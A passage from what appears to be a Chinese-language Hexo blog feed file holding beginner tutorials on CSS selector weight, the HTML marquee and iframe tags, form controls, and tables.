src="/css/cd11.png"></p><p>5.如何计算权重<br>（数标签的数量）先数id,如果id相等再数类如果id不相等id多的选择器权重高，权重越高，优先级越高。如果id选择器数量相同，再数类选择器，最后数标签。</p><p>比较权重的时候一定要注意：我们的选择器一定要命中对应的标签才可能让标签拥有对应的属性。</p>]]></content>
      
      
      
        <tags>
            
            <tag> -css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第九篇博客</title>
      <link href="/2021/01/07/di-jiu-pian-bo-ke/"/>
      <url>/2021/01/07/di-jiu-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML-marquee标签"><a href="#HTML-marquee标签" class="headerlink" title="HTML marquee标签"></a>HTML marquee标签</h1><a id="more"></a><h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h2><p>marquee标签是个容器标签，marquee(文字滚动)。</p><h2 id="2-语法"><a href="#2-语法" class="headerlink" title="2.语法"></a>2.语法</h2><p>&lt; marquee&gt; &lt; /marquee&gt;</p><h2 id="3-事件"><a href="#3-事件" class="headerlink" title="3.事件"></a>3.事件</h2><h3 id="3-1-onMouseOut-”this-start-”-：用来设置鼠标移出该区域时继续滚动"><a href="#3-1-onMouseOut-”this-start-”-：用来设置鼠标移出该区域时继续滚动" class="headerlink" title="3.1 onMouseOut=”this.start()” ：用来设置鼠标移出该区域时继续滚动"></a>3.1 onMouseOut=”this.start()” ：用来设置鼠标移出该区域时继续滚动</h3><h3 id="3-2-onMouseOver-”this-stop-”：用来设置鼠标移入该区域时停止滚动"><a href="#3-2-onMouseOver-”this-stop-”：用来设置鼠标移入该区域时停止滚动" class="headerlink" title="3.2 onMouseOver=”this.stop()”：用来设置鼠标移入该区域时停止滚动"></a>3.2 onMouseOver=”this.stop()”：用来设置鼠标移入该区域时停止滚动</h3><h2 id="4-属性"><a href="#4-属性" class="headerlink" title="4.属性"></a>4.属性</h2><h3 id="4-1-scrollamount"><a href="#4-1-scrollamount" class="headerlink" title="4.1 scrollamount"></a>4.1 scrollamount</h3><p>1.定义<br>scrollamount设定活动字幕的滚动速度,单位为pixels(像素)。值越大速度越快。默认为6。</p><p>2.语法<br>&lt; marquee scrollamount=”10” &gt;scrollamount=”10” &lt; /marquee&gt;</p><p>&lt; marquee scrollamount=”20” &gt;scrollamount=”20” &lt; /marquee&gt;</p><h3 id="4-2-direction"><a href="#4-2-direction" class="headerlink" title="4.2 direction"></a>4.2 direction</h3><p>1.定义<br>设置 marquee 内文本滚动的方向。可选值有 left, right, up and down。默认值为 left。</p><p>2.语法<br>&lt; marquee direction=”down” &gt;设定活动字幕的滚动方向direction=”down”：向下&lt; /marquee&gt;</p><p>&lt; marquee direction=”left”&gt;设定活动字幕的滚动方向direction=”left”：向左&lt; /marquee&gt;</p><p>&lt; marquee direction=”right”&gt;设定活动字幕的滚动方向direction=”right”：向右&lt; /marquee&gt;</p><p>&lt; marquee direction=”up”&gt;设定活动字幕的滚动方向direction=”up”：向上&lt; /marquee&gt;</p><h3 id="4-3-behavior"><a href="#4-3-behavior" class="headerlink" title="4.3 behavior"></a>4.3 behavior</h3><p>1.定义<br>设置文本在 marquee 元素内如何滚动。可选值有 scroll，slide 和 alternate。 默认值为 scroll。</p><p>alternate:表示在两端之间来回滚动。<br>scroll:表示由一端滚到另一端，会重复。<br>slide:表示由一端滚动到另一端，不会重复。</p><p>2.语法<br>&lt; marquee behavior=”alternate”&gt;alternate：表示在两端之间来回滚动。 &lt; /marquee&gt;</p><p>&lt; marquee behavior=”scroll”&gt;scroll：表示由一端滚动到另一端，会重复。&lt; /marquee&gt;</p><p>&lt; marquee behavior=”slide”&gt;slide：表示由一端滚动到另一端，不会重复。&lt; /marquee&gt;</p><h3 id="4-4-hspace和vspace"><a href="#4-4-hspace和vspace" class="headerlink" title="4.4 hspace和vspace"></a>4.4 hspace和vspace</h3><p>1.定义<br>hspace:设置水平边距。<br>vspace:以像素或百分比值设置垂直边距。</p><p>2.语法<br>&lt; marquee hspace=”50”  vspace=”70”&gt;水平边距50 垂直边距70&lt; /marquee&gt;</p><p><img src="/images/hv.jpg"></p><h2 id="4-5-align"><a href="#4-5-align" class="headerlink" title="4.5 align"></a>4.5 align</h2><p>1.定义<br>设定marquee标签内容的对齐方式。</p><p>2.语法<br>&lt; marquee align=”top” &gt;align=”top”： 顶部对齐。 &lt; /marquee&gt;</p><p>3.属性<br>absbottom：绝对底部对齐（与g、p等字母的最下端对齐）</p><p>absmiddle：绝对中央对齐</p><p>baseline：底线对齐</p><p>bottom：底部对齐（默认）</p><p>left：左对齐</p><p>middle：中间对齐</p><p>right：右对齐</p><p>texttop：顶线对齐</p><p>top：顶部对齐</p><h2 id="4-6-loop"><a href="#4-6-loop" class="headerlink" title="4.6 loop"></a>4.6 loop</h2><p>1.定义<br>设置marquee滚动的次数。默认值为 −1，表示 marquee 将连续滚动。</p><p>2.语法<br>&lt; marquee loop=”-1” &gt;我会不停地走。&lt; /marquee&gt;</p><p>&lt; marquee loop=”2” &gt;我只走两次哦&lt; /marquee&gt;</p><h2 id="4-7-scrolldelay"><a href="#4-7-scrolldelay" class="headerlink" title="4.7 scrolldelay"></a>4.7 scrolldelay</h2><p>1.定义<br>设置每次滚动时的时间间隔（以毫秒为单位）。默认值为 85。，值越大，速度越慢。通常scrollDelay是不需要设置的。</p><p>2.语法<br> &lt; marquee scrolldelay=120 scrollamount=10&gt;啦啦啦，我走一步，停一停！&lt; /marquee&gt;</p><h2 id="5-例子"><a href="#5-例子" class="headerlink" title="5.例子"></a>5.例子</h2><p><img src="/images/m1.png"><br>运行结果:<br><img src="/images/m1yx.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第八篇博客</title>
      <link href="/2021/01/06/di-ba-pian-bo-ke/"/>
      <url>/2021/01/06/di-ba-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML-浮动框架iframe"><a href="#HTML-浮动框架iframe" class="headerlink" title="HTML 浮动框架iframe"></a>HTML 浮动框架iframe</h1><a id="more"></a><h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h2><p>1.浮动框架是一种较为特殊的框架，它是在浏览器窗口中嵌套的子窗口，整个页面不一定是框架页面，但要包含一个框架窗口。</p><p>2.iframe 元素会创建包含另外一个文档的内联框架（即行内框架）。</p><p>3.iframe框架可以自定义宽度和高度，并且放在网页的任意位置。</p><h2 id="2-语法"><a href="#2-语法" class="headerlink" title="2.语法"></a>2.语法</h2><p>&lt; iframe src=”源文件地址” width=”浮动框架的宽” height=”浮动框架的高”&gt;&lt; /iframe &gt;</p><p>src属性是iframe的必需属性，它定义浮动框架页面的地址。</p><h2 id="3-例子"><a href="#3-例子" class="headerlink" title="3.例子"></a>3.例子</h2><p><img src="/images/fd.png"><br>运行结果:<br><img src="/images/fdyx.png"></p><h2 id="4-iframe滚动条"><a href="#4-iframe滚动条" class="headerlink" title="4.iframe滚动条"></a>4.iframe滚动条</h2><h3 id="4-1定义"><a href="#4-1定义" class="headerlink" title="4.1定义"></a>4.1定义</h3><p>对于浮动框架iframe的滚动条，我们可以使用scrolling属性来控制。</p><h3 id="4-2语法"><a href="#4-2语法" class="headerlink" title="4.2语法"></a>4.2语法</h3><p>&lt; iframe src=”源文件地址” width=”浮动框架的宽” height=”浮动框架的高” scrolling=”取值”&gt;&lt; /iframe &gt;</p><h3 id="4-3属性值"><a href="#4-3属性值" class="headerlink" title="4.3属性值"></a>4.3属性值</h3><p>1.auto:默认值，整个表格在浏览器页面中左对齐</p><p>2.yes：总是显示滚动条</p><p>3.no:不显示滚动条</p><h2 id="5-删除边框"><a href="#5-删除边框" class="headerlink" title="5. 删除边框"></a>5. 删除边框</h2><p>frameborder 属性规定是否显示 iframe 周围的边框,设置属性值为 “0” 就可以移除边框。</p><p>例如:<br><img src="/images/cbk.png"><br>运行结果:<br><img src="/images/cbkyx.png"></p><h2 id="6-使用iframe作为链接的目标"><a href="#6-使用iframe作为链接的目标" class="headerlink" title="6.使用iframe作为链接的目标"></a>6.使用iframe作为链接的目标</h2><p>iframe 可用作链接的目标（target）。</p><p>链接的 target 属性必须引用 iframe 的 name 属性。</p><p>例如:<br><img src="/images/lj.png"><br>运行结果:<br><img src="/images/ljyx.png"></p><p>由于链接的目标匹配(target) iframe 的名称，所以链接会在 iframe 中打开该链接。</p>]]></content>
      
      
      
        <tags>
            
            <tag> -html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第七篇博客</title>
      <link href="/2021/01/05/di-qi-pian-bo-ke/"/>
      <url>/2021/01/05/di-qi-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML表单"><a href="#HTML表单" class="headerlink" title="HTML表单"></a>HTML表单</h1><a id="more"></a><h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h2><p>1.HTML 表单用于收集不同类型的用户输入。<br>2.表单指的是文本框、按钮、下拉列表的统称。</p><h2 id="2-form标签"><a href="#2-form标签" class="headerlink" title="2.form标签"></a>2.form标签</h2><h3 id="2-1定义"><a href="#2-1定义" class="headerlink" title="2.1定义"></a>2.1定义</h3><p>from标签是用来创建供用户输入的html表单。</p><h3 id="2-2语法"><a href="#2-2语法" class="headerlink" title="2.2语法"></a>2.2语法</h3><p>&lt; form &gt;表单标签&lt; /form &gt; </p><h3 id="2-3属性"><a href="#2-3属性" class="headerlink" title="2.3属性"></a>2.3属性</h3><h4 id="2-3-1表单名称name属性"><a href="#2-3-1表单名称name属性" class="headerlink" title="2.3.1表单名称name属性"></a>2.3.1表单名称name属性</h4><p>1.定义<br>name属性给表单进行命名，防止表单提交后，在后台程序中出现混乱。</p><p>2.语法<br>&lt; form  name=”表单名称”&gt;表单标签&lt; /form &gt; 表单名称中不能包含特殊字符和空格。</p><p>3.例子<br><img src="/images/n.png"><br>表单名称为my</p><h4 id="2-3-2提交表单action属性"><a href="#2-3-2提交表单action属性" class="headerlink" title="2.3.2提交表单action属性"></a>2.3.2提交表单action属性</h4><p>1.定义<br>action属性规定向何处提交表单的地址（URL）</p><p>2.语法<br>&lt; form  action=”表单的处理程序”&gt;表单标签&lt; /form &gt;<br>表单的处理程序指的是表单提交地址。</p><p>3.例子<br><img src="/images/ac.png"><br>mailto:<a href="mailto:&#49;&#x30;&#55;&#57;&#53;&#x34;&#54;&#x39;&#49;&#50;&#x40;&#113;&#x71;&#x2e;&#x63;&#x6f;&#x6d;">&#49;&#x30;&#55;&#57;&#53;&#x34;&#54;&#x39;&#49;&#50;&#x40;&#113;&#x71;&#x2e;&#x63;&#x6f;&#x6d;</a>是程序提交地址。</p><h4 id="2-3-3传送方法method属性"><a href="#2-3-3传送方法method属性" class="headerlink" title="2.3.3传送方法method属性"></a>2.3.3传送方法method属性</h4><p>1.定义<br>method 属性规定在提交表单时所用的 HTTP 方法（GET 或 POST）</p><p>2.语法<br>&lt; form method=“传送方法(get/post)” &gt;表单标签&lt; /form &gt;</p><p>3.get与post如何选择？<br>get：</p><p>1.如果表单提交是被动的（比如搜索引擎查询），并且没有敏感信息。<br>2.GET 最适合少量数据的提交。浏览器会设定容量限制。</p><p>post:</p><p>1.如果表单正在更新数据，或者包含敏感信息（例如密码）。<br>2.POST 的安全性更加，因为在页面地址栏中被提交的数据是不可见的。</p><p>4.例子<br><img src="/images/pos.png"></p><h4 id="2-3-4目标显示方式target属性"><a href="#2-3-4目标显示方式target属性" class="headerlink" title="2.3.4目标显示方式target属性"></a>2.3.4目标显示方式target属性</h4><p>1.定义<br>target属性用来指定目标窗口的打开方式。</p><p>2.语法<br>&lt; form target=”目标显示方式”&gt;&lt; /form &gt;</p><p>3.target属性取值<br>1.<em>self(默认方式，在当前窗口打开页面)<br>2._blank(在新的空白窗口打开页面)<br>3._parent(在父级窗口中打开页面)<br>4.</em> top (表示页面载入到包含该链接的窗口，取代当前窗口中的所有页面)</p><p>4.例子<br><img src="/images/mb.png"></p><h4 id="2-3-5编码方式enctype"><a href="#2-3-5编码方式enctype" class="headerlink" title="2.3.5编码方式enctype"></a>2.3.5编码方式enctype</h4><p>1.定义<br>enctype属性用于设置表单信息提交的编码格式。</p><p>2.取值<br>enctype属性值为application/x-www-form-urlencoded 默认编码方式<br>enctype属性值为multipart/form-data  MIME编码，对于上传文件这种表单必须使用该值<br>（一般情况，默认值就行。除非该form标签中使用了上传文件表单）</p><p>3.例子<br><img src="/images/jm.png"></p><h2 id="3-input标签"><a href="#3-input标签" class="headerlink" title="3.input标签"></a>3.input标签</h2><h3 id="3-1定义"><a href="#3-1定义" class="headerlink" title="3.1定义"></a>3.1定义</h3><p>input标签用于向用户收集信息</p><h3 id="3-2语法"><a href="#3-2语法" class="headerlink" title="3.2语法"></a>3.2语法</h3><p>&lt; input type=”表单类型” /&gt;<br>通过不同的type属性，创建不同的输入控件</p><h3 id="3-3属性"><a href="#3-3属性" class="headerlink" title="3.3属性"></a>3.3属性</h3><h4 id="3-3-1单行文本框text"><a href="#3-3-1单行文本框text" class="headerlink" title="3.3.1单行文本框text"></a>3.3.1单行文本框text</h4><p>1.语法<br>&lt; input type=”text”/&gt;</p><p>2.属性<br>1.value:定义文本框的默认值，文本框内文字<br>2.size:定义文本框长度，以字符为单位<br>3.maxlength:设置文本框中最多可以输入的字符数</p><p>&lt; input type=”text” value=”默认文字” size=”文本框长度” maxlength=”最多输入的字符数”/&gt;</p><p>3.例子<br><img src="/images/f1.png"><br>运行结果:<br><img src="/images/f1yx.png"></p><h4 id="3-3-2密码文本框password"><a href="#3-3-2密码文本框password" class="headerlink" title="3.3.2密码文本框password"></a>3.3.2密码文本框password</h4><p>1.语法<br>&lt; input type=”password”/&gt;</p><p>2.属性<br>1.value:定义文本框的默认值，文本框内文字<br>2.size:定义文本框长度，以字符为单位<br>3.maxlength:设置文本框中最多可以输入的字符数</p><p>&lt; input type=”password” value=”默认文字” size=”文本框长度” maxlength=”最多输入的字符数”/&gt;</p><p>3.例子<br><img src="/images/p1.png"><br>运行结果:<br><img src="/images/p1yx.png"></p><h4 id="3-3-3单选按钮radio"><a href="#3-3-3单选按钮radio" class="headerlink" title="3.3.3单选按钮radio"></a>3.3.3单选按钮radio</h4><p>1.定义<br>HTML中，单选按钮从选项列表中选择一项，选项与选项之间是互斥的。</p><p>2.语法<br>&lt; input type=”radio” name=”单选按钮所在的组名” value=”单选按钮的取值” /&gt;<br>name和value是单选按钮必要的两个属性，必须设置。</p><p>3.例子<br><img src="/images/dx1.png"><br>运行结果:<br><img src="/images/dx1yx.png"><br>对于同一个问题的不同选项，必须要设置一个相同的name属性值，这样才能把这些选项归为同一个问题。</p><h4 id="3-3-4复选框checkbox"><a href="#3-3-4复选框checkbox" class="headerlink" title="3.3.4复选框checkbox"></a>3.3.4复选框checkbox</h4><p>1.定义<br>复选框可以从列表中选择多项。</p><p>2.语法<br>&lt; input type=”checkbox” value=”复选框取值”<br>checked=”checked” /&gt;<br>checked属性表示该选项在默认情况下已经被选中。</p><p>html中复选框没有文本，需要加入label标签，并用label标签的for属性指向复选框的id。</p><p>3.例子<br><img src="/images/fx1.png"><br>运行结果:<br><img src="/images/fx1yx.png"></p><p>&lt; label for=”checkbox1” &gt;HTML&lt; /label &gt;表示label的for属性指向id为checkbox1的复选框。</p><h4 id="3-3-5隐藏域hidden"><a href="#3-3-5隐藏域hidden" class="headerlink" title="3.3.5隐藏域hidden"></a>3.3.5隐藏域hidden</h4><p>1.定义<br>向服务器传递数据，不想让用户看见。隐藏域包含要提交处理的数据，但这些数据并不显示在浏览器中。</p><p>2.语法<br>&lt; input type=”hidden” /&gt;</p><p>3.例子<br><img src="/images/hi.png"></p><h4 id="3-3-6文件域file"><a href="#3-3-6文件域file" class="headerlink" title="3.3.6文件域file"></a>3.3.6文件域file</h4><p>1.定义<br>文件上传</p><p>2.语法<br>&lt; input type=”file” /&gt;<br>使用时，必须在form标签中说明编码方式enctype=”multipart/form-data”。只有这样，服务器才能接收到正确的信息。<br>3.例子<br><img src="/images/wj.png"><br>运行结果:<br><img src="/images/wjyx.png"></p><h4 id="3-3-7表单按钮-普通按钮、重置按钮、提交按钮"><a href="#3-3-7表单按钮-普通按钮、重置按钮、提交按钮" class="headerlink" title="3.3.7表单按钮(普通按钮、重置按钮、提交按钮)"></a>3.3.7表单按钮(普通按钮、重置按钮、提交按钮)</h4><h4 id="3-3-7-1普通按钮button"><a href="#3-3-7-1普通按钮button" class="headerlink" title="3.3.7.1普通按钮button"></a>3.3.7.1普通按钮button</h4><p>1.定义<br>HTML中，普通按钮一般情况下要配合JavaScript脚本来进行表单的实现。</p><p>2.语法<br>&lt; input type=”button” value=”普通按钮的值” onclick=”JavaScript脚本程序” /&gt;<br>value取值是显示在按钮上的文字，onclick是普通按钮事件。<br>3.例子<br><img src="/images/an1.png"><br>运行结果:<br><img src="/images/an1yx.png"></p><h4 id="3-3-7-2提交按钮submit"><a href="#3-3-7-2提交按钮submit" class="headerlink" title="3.3.7.2提交按钮submit"></a>3.3.7.2提交按钮submit</h4><p>1.定义<br>提交按钮可以看成一种具有特殊功能的普通按钮，单击提交按钮可以将表单内容提交给服务器处理。</p><p>2.语法<br>&lt; input type=”submit” value=”提交按钮的值” /&gt;<br>value取值是显示在按钮上的文字。<br>3.例子<br><img src="/images/tj1.png"><br>运行结果:<br><img src="/images/tj1yx.png"></p><h4 id="3-3-7-3重置按钮reset"><a href="#3-3-7-3重置按钮reset" class="headerlink" title="3.3.7.3重置按钮reset"></a>3.3.7.3重置按钮reset</h4><p>1.定义<br>重置按钮可以看成一种具有特殊功能的普通按钮，单击重置按钮可以清除用户在页面表单中输入的信息。</p><p>2.语法<br>&lt; input type=”reset” value=”重置按钮的值” /&gt;<br>value取值是显示在按钮上的文字。</p><p>重置按钮只能清除当前所在form标签内的表单元素内容，对当前所在form标签之外的表单元素内容清除无效。<br>3.例子<br><img src="/images/cz1.png"><br>运行结果:<br><img src="/images/cz1yx.png"></p><h4 id="3-3-8图片域image-既有按钮的特点也有图像的特点"><a href="#3-3-8图片域image-既有按钮的特点也有图像的特点" class="headerlink" title="3.3.8图片域image(既有按钮的特点也有图像的特点)"></a>3.3.8图片域image(既有按钮的特点也有图像的特点)</h4><p>1.语法<br>&lt; input type=”image” src=”图像的路径”  /&gt;</p><p>2.例子<br><img src="/images/tp1.png"><br>运行结果:<br><img src="/images/tp1yx.png"></p><h4 id="3-3-9placeholder属性-h5新增"><a href="#3-3-9placeholder属性-h5新增" class="headerlink" title="3.3.9placeholder属性(h5新增)"></a>3.3.9placeholder属性(h5新增)</h4><p>1.定义和用法<br>1.placeholder 属性提供可描述输入字段预期值的提示信息。<br>2.该提示会在输入字段为空时显示，并会在字段获得焦点时消失。</p><p>placeholder 属性适用于以下的 &lt; input &gt; 类型：text, search, url, telephone, email 以及 password。</p><p>2.语法<br>&lt; input placeholder=”text” &gt;</p><p>3.例子<br><img src="/images/pl.png"><br>运行结果:<br><img src="/images/plyx.png"></p><h4 id="3-3-10value属性"><a href="#3-3-10value属性" class="headerlink" title="3.3.10value属性"></a>3.3.10value属性</h4><p>1.定义和用法<br>1.value 属性为 input 元素设定值。<br>2.对于不同的输入类型，value 属性的用法也不同：<br>type=”button”, “reset”, “submit” - 定义按钮上的显示的文本<br>type=”text”, “password”, “hidden” - 定义输入字段的初始值<br>type=”checkbox”, “radio”, “image” - 定义与输入相关联的值<br>注释：&lt; input type=”checkbox” &gt; 和 &lt; input type=”radio”&gt; 中必须设置 value 属性。</p><p>注释：value 属性无法与 &lt; input type=”file”&gt; 一同使用。</p><p>2.语法<br>&lt; input value=”value值” &gt;</p><p>3.例子<br><img src="/images/v1.png"><br>运行结果:<br><img src="/images/v1yx.png"></p><h4 id="3-3-11checked属性"><a href="#3-3-11checked属性" class="headerlink" title="3.3.11checked属性"></a>3.3.11checked属性</h4><p>1.定义和用法<br>&lt; input &gt;标签的checked属性用于指定，在加载页面时将多选框或单选按钮设为选中状态。</p><p>checked属性与&lt; input type=”checkbox” &gt;或<br>&lt; input type=”radio” &gt;一起使用。<br>2.语法<br>&lt; input checked=”checked” &gt;<br>表示加载页面时，默认选中哪一项。</p><p>3.例子<br><img src="/images/ch.png"><br>运行结果:<br><img src="/images/chyx.png"></p><h4 id="3-3-12disabled属性"><a href="#3-3-12disabled属性" class="headerlink" title="3.3.12disabled属性"></a>3.3.12disabled属性</h4><p>1.定义和用法<br>1.disabled属性是一个布尔值。<br>2.disabled属性规定应该禁用的&lt; input &gt;元素，被禁用元素无法使用和点击。<br>3.disabled 属性进行设置，使用户在满足某些条件时（比如选中复选框，等等）才能使用 &lt; input&gt; 元素。然后，可使用 JavaScript 来删除 disabled 值，使该&lt; input &gt; 元素变为可用的状态。<br>4.被禁用的input元素不会被提交</p><p>注释：disabled 属性无法与 &lt; input type=”hidden” &gt; 一起使用。</p><p>2.语法<br>&lt; input disabled=”disabled” &gt;</p><p>3.例子<br><img src="/images/di1.png"><br>运行结果:<br><img src="/images/di1yx.png"></p><h4 id="3-3-13readonly属性"><a href="#3-3-13readonly属性" class="headerlink" title="3.3.13readonly属性"></a>3.3.13readonly属性</h4><p>1.定义和用法<br>1.readonly属性用于指定输入框为只读。<br>2.只读的输入框不能被编辑，不过它仍然可以获取焦点，用户仍然可以复制其中的文本。<br>3.网页设计者可以利用readonly属性，防止用户在满足一定条件（例如选中一个复选框，等等）之前编辑输入框中的文本。然后，待条件满足时，再通过JavaScript移除readonly属性，从而使得文本输入框可以编辑。</p><p>readonly属性仅适用于文本输入框（&lt; input type=”text” &gt;）和密码输入框（&lt; input type=”password”&gt;）。</p><p>2.语法<br>&lt; input readonly=”readonly” &gt;</p><p>3.例子<br><img src="/images/r1.png"><br>运行结果:<br><img src="/images/r1yx.png"><br>用户不可以编辑文本框内容，可以复制其内容。</p><h2 id="3-label标签"><a href="#3-label标签" class="headerlink" title="3.label标签"></a>3.label标签</h2><h3 id="3-1定义及用法"><a href="#3-1定义及用法" class="headerlink" title="3.1定义及用法"></a>3.1定义及用法</h3><p>1.在html中，&lt; label &gt;标签通常和&lt; input &gt;标签一起使用，&lt; label &gt;标签为input元素定义标注（标记）。<br>2.&lt; label &gt;标签在单选按钮和复选按钮上经常被使用，使用该标签后，你点击单选按钮或复选按钮的文本也是可以选中的。</p><h3 id="3-2语法-1"><a href="#3-2语法-1" class="headerlink" title="3.2语法"></a>3.2语法</h3><p>&lt; label for=”关联控件的id” form=”所属表单id列表”&gt;文本内容&lt; /label &gt;</p><p>1.关联控件的id一般指的是input元素的id；<br>2.在html5中还新增了一个属性form，form属性是用来规定所属的一个或多个表单的 id 列表，以空格隔开；<br>3.当&lt; label &gt;标签不在表单标签&lt; form&gt;中时，就需要使用form属性来指定所属表单；</p><h3 id="3-3例子"><a href="#3-3例子" class="headerlink" title="3.3例子"></a>3.3例子</h3><p><img src="/images/la1.png"><br>运行结果:<br><img src="/images/la1yx.png"></p><h2 id="4-下拉列表select"><a href="#4-下拉列表select" class="headerlink" title="4.下拉列表select"></a>4.下拉列表select</h2><h3 id="4-1定义"><a href="#4-1定义" class="headerlink" title="4.1定义"></a>4.1定义</h3><p>HTML中，select标签是使用来定义下拉列表的。</p><h3 id="4-2语法"><a href="#4-2语法" class="headerlink" title="4.2语法"></a>4.2语法</h3><p>&lt; select &gt;</p><p>&lt; option value=”值”&gt;选项内容&lt; /option&gt;</p><p>&lt; option value=”值”&gt;选项内容&lt; /option&gt;</p><p>&lt; /select&gt;</p><h3 id="4-3属性"><a href="#4-3属性" class="headerlink" title="4.3属性"></a>4.3属性</h3><h4 id="4-3-1select标签属性"><a href="#4-3-1select标签属性" class="headerlink" title="4.3.1select标签属性"></a>4.3.1select标签属性</h4><p>1.multiple属性</p><p>可选属性，只有一个属性值”multiple”。默认情况下，只能选一项，当设置为multiple=”multiple”时，可选择多项。</p><p>语法:<br>&lt; select  multiple=”multiple”&gt;</p><p>&lt; option value=”值”&gt;选项内容&lt; /option&gt;</p><p>&lt; option value=”值”&gt;选项内容&lt; /option&gt;</p><p>&lt; /select&gt;</p><p>2.size属性</p><p>定义下拉列表展开后可见选项的数目。</p><p>语法:<br>&lt; select  multiple=”multiple” size=”可见列表项的数目”&gt;</p><p>&lt; option value=”值”&gt;选项内容&lt; /option&gt;</p><p>&lt; option value=”值”&gt;选项内容&lt; /option&gt;</p><p>&lt; /select&gt;</p><h4 id="4-3-2select例子"><a href="#4-3-2select例子" class="headerlink" title="4.3.2select例子"></a>4.3.2select例子</h4><p><img src="/images/sl.png"><br>运行结果:<br><img src="/images/slyx.png"></p><h4 id="4-3-3option标签属性"><a href="#4-3-3option标签属性" class="headerlink" title="4.3.3option标签属性"></a>4.3.3option标签属性</h4><p>定义下拉列表项</p><p>1.属性</p><p>1.1value:选项值   1.2selected:是否选中</p><p>2.语法:</p><p>&lt; select  multiple=”multiple” size=”可见列表项的数目”&gt;</p><p>&lt; option value=”值” selected=”selected”&gt;选项内容&lt; /option&gt;</p><p>&lt; option value=”值”&gt;选项内容&lt; /option&gt;</p><p>&lt; /select&gt;</p><h2 id="5-多行文本框textarea"><a href="#5-多行文本框textarea" class="headerlink" title="5.多行文本框textarea"></a>5.多行文本框textarea</h2><h3 id="5-1定义"><a href="#5-1定义" class="headerlink" title="5.1定义"></a>5.1定义</h3><p>多行文本框可以输入多行消息，使用textarea标签。</p><h3 id="5-2语法"><a href="#5-2语法" class="headerlink" title="5.2语法"></a>5.2语法</h3><p>&lt; textarea rows=”行数” cols=”列数” &gt;多行文本框内容&lt; /textarea &gt;</p><p>要对多行文本框设置默认内容，可以在标签内部添加。默认内容，可以设置也可以不设置。</p><h3 id="5-3例子"><a href="#5-3例子" class="headerlink" title="5.3例子"></a>5.3例子</h3><p><img src="/images/dh.png"><br>运行结果:<br><img src="/images/dhyx.png"></p><h2 id="6-button标签按钮"><a href="#6-button标签按钮" class="headerlink" title="6.button标签按钮"></a>6.button标签按钮</h2><h3 id="6-1语法"><a href="#6-1语法" class="headerlink" title="6.1语法"></a>6.1语法</h3><p>&lt; button&gt;文本或图像&lt; /button&gt;</p><p>button标签与表单按钮相比，button标签功能强大。</p><h3 id="5-3例子-1"><a href="#5-3例子-1" class="headerlink" title="5.3例子"></a>5.3例子</h3><p><img src="/images/b1.png"><br>运行结果:<br><img src="/images/b1yx.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第六篇博客</title>
      <link href="/2021/01/05/di-liu-pian-bo-ke/"/>
      <url>/2021/01/05/di-liu-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML表格"><a href="#HTML表格" class="headerlink" title="HTML表格"></a>HTML表格</h1><a id="more"></a><h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h2><p>表格由table标签来定义。每个表格均有若干行（由tr标签定义），每行被分割为若干单元格（由td标签定义）。字母td指表格数据，即数据单元格的内容。单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。默认情况下，表格没有边框。</p><h2 id="2-基本结构"><a href="#2-基本结构" class="headerlink" title="2.基本结构"></a>2.基本结构</h2><h3 id="2-1tr标签"><a href="#2-1tr标签" class="headerlink" title="2.1tr标签"></a>2.1tr标签</h3><p>tr标签定义表格的行</p><h3 id="2-2td标签"><a href="#2-2td标签" class="headerlink" title="2.2td标签"></a>2.2td标签</h3><p>td标签定义表格的单元格</p><h3 id="2-3th标签"><a href="#2-3th标签" class="headerlink" title="2.3th标签"></a>2.3th标签</h3><p>th标签定义表格的表头，浏览器默认会以粗体和居中的样式显示。</p><h3 id="2-4表格的标题caption"><a href="#2-4表格的标题caption" class="headerlink" title="2.4表格的标题caption"></a>2.4表格的标题caption</h3><p>caption标签定义表格的标题，一个表格只能含有一个表格标题。</p><h3 id="2-5表格语义化"><a href="#2-5表格语义化" class="headerlink" title="2.5表格语义化"></a>2.5表格语义化</h3><p>thead、tbody和tfoot这三个标签也是表格中非常重要的标签，在语义上分别代表了表头、表身、表脚。</p><h4 id="2-5-1thead标签"><a href="#2-5-1thead标签" class="headerlink" title="2.5.1thead标签"></a>2.5.1thead标签</h4><p>定义表格的表头</p><h4 id="2-5-2tbody标签"><a href="#2-5-2tbody标签" class="headerlink" title="2.5.2tbody标签"></a>2.5.2tbody标签</h4><p>定义表格的主体(表身)</p><h4 id="2-5-3tfoot标签"><a href="#2-5-3tfoot标签" class="headerlink" title="2.5.3tfoot标签"></a>2.5.3tfoot标签</h4><p>定义表格的页脚(表脚)</p><p>例如:<br><img src="/images/bg.png"><br>运行结果:<br><img src="/images/bgyx.png"></p><h2 id="3-合并行rowspan"><a href="#3-合并行rowspan" class="headerlink" title="3.合并行rowspan"></a>3.合并行rowspan</h2><p>合并行使用td标签的rowspan属性</p><h3 id="3-1语法"><a href="#3-1语法" class="headerlink" title="3.1语法"></a>3.1语法</h3><p>&lt; td rowspan=”跨度的行数” &gt;</p><h3 id="3-2例子"><a href="#3-2例子" class="headerlink" title="3.2例子"></a>3.2例子</h3><p>例如:<br><img src="/images/hbh.png"><br>运行结果:<br><img src="/images/hbhyx.png"></p><h2 id="3-合并列colspan"><a href="#3-合并列colspan" class="headerlink" title="3.合并列colspan"></a>3.合并列colspan</h2><p>表格合并列指的是将几个列进行合并。</p><h3 id="3-1语法-1"><a href="#3-1语法-1" class="headerlink" title="3.1语法"></a>3.1语法</h3><p>&lt; td colspan=”跨度的列数” &gt;</p><h3 id="3-2例子-1"><a href="#3-2例子-1" class="headerlink" title="3.2例子"></a>3.2例子</h3><p>例如:<br><img src="/images/hbl.png"><br>运行结果:<br><img 